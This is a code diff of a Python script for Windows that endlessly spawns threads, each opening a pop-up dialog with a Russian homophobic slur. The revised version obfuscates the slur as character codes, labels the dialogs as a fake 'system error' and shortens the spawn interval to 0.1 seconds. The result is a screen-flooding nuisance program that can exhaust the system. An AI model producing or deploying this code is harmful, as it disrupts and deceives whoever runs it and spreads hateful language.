@@ -1,44 +1,23 @@
-import subprocess
-import time
-import os
-import threading
-import sys
 import ctypes
+import threading
+import time
 
-s = 'с'
-i = 'и'
-p = 'п'
-e = 'е'
-s2 = 'с'
-t = 'т'
-a = 'а'
-t2 = 'т'
-e2 = 'п'
-b = 'и'
-o = 'д'
-r = 'р'
-
-word = s + i + p + e + s2 + t + a + t2 + " " + e2 + b + o + r
+word = chr(1089)+chr(1080)+chr(1087)+chr(1077)+chr(1089)+chr(1090)+chr(1072)+chr(1090)+' '+chr(1087)+chr(1080)+chr(1076)+chr(1088)
 running = True
 
-def show_message_box():
+def show():
     try:
-        ctypes.windll.user32.MessageBoxW(0, word, "Сообщение", 0x40 | 0x1)
+        ctypes.windll.user32.MessageBoxTimeoutW(0, word, 'ОШИБКА СИСТЕМЫ', 0x10, 0, 0)
     except:
         pass
 
-def run_message_loop():
+def loop():
     while running:
-        try:
-            threading.Thread(target=show_message_box).start()
-            time.sleep(0.5)
-        except:
-            pass
+        threading.Thread(target=show).start()
+        time.sleep(0.1)
 
-threading.Thread(target=run_message_loop).start()
-
+threading.Thread(target=loop).start()
 try:
-    while True:
-        time.sleep(1)
-except KeyboardInterrupt:
+    while 1: time.sleep(1)
+except:
     running = False
